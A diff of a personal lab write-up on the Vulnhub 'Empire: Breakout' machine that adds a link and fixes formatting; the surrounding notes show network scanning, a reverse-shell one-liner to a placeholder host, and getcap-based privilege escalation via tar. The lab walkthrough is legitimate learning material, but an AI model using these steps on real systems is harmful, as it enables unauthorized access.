@@ -2,6 +2,8 @@
 
 This is a easy vulnerable machine I did from vulnhub. It was easy but it took me a little longer than I expected and I learned quite a lot.  This post is in the format of my notes.
 
+[Empire: Breakout from Vulnhub](https://www.vulnhub.com/entry/empire-breakout,751/)
+
 I started off with an arp-scan
 
 `arp-scan x.x.x.x/24`
@@ -183,7 +185,7 @@ sh -i >& /dev/tcp/replacewithIP/replacewithportnumber 0>&1
 ![Untitled 2](https://user-images.githubusercontent.com/55252902/152679168-3de23bf3-9534-490f-9d3e-763e61b29c8b.png)
 ![Untitled 3](https://user-images.githubusercontent.com/55252902/152679175-dbc6f551-636c-4428-82b3-c2f588c7b7bb.png)
 ![Untitled 4](https://user-images.githubusercontent.com/55252902/152679181-696b2d6a-c091-4e3e-8127-6dd0e07fbdd3.png)
- ![Untitled 5](https://user-images.githubusercontent.com/55252902/152679183-02ef197a-8510-4b84-a47b-694dc92459a5.png)
+![Untitled 5](https://user-images.githubusercontent.com/55252902/152679183-02ef197a-8510-4b84-a47b-694dc92459a5.png)
 
 
  
@@ -209,7 +211,7 @@ getcap -r / 2>/dev/null
 
 tar is a binary, use getcap to display capabilities of this binary file.
 
-[Privlege escalation vector getcap]([An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/))
+[Privlege escalation vector getcap - An Interesting Privilege Escalation vector](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
 
 [Linux privlege escalation using capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
 
